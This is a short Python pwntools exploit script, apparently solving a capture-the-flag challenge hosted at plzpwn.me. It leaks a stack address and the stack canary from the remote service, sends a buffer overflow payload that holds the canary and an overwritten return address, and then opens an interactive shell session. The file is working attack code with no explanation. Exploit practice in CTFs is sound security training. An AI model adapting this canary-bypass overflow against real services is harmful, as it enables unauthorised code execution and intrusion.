from pwn import *

p = remote('plzpwn.me',2003)
p.recvuntil("stack pointer ")
useful = p.recv(10)
p.recv()
p.sendline('a')
p.recv()
p.sendline('4AAA' + 'ADAM'*23)
log.info("sent 4")
print hex(int(useful,16))
sent = (int(useful,16)  + 0x71 - 0x8)
p.sendline(pack(sent))
log.info("sent " + hex(sent))
p.recv()
p.sendline('b')
log.info("sent b")
p.recvuntil(": ");
canary = p.recv(4)
log.info( canary)
p.recv()
p.sendline('a')
p.recv()
attack = '0AAA' + 'A'*92 + canary + p32(0x80486c6)*3
p.sendline(attack)
log.info("sent attack")
p.recv()
p.sendline('d')
p.interactive()
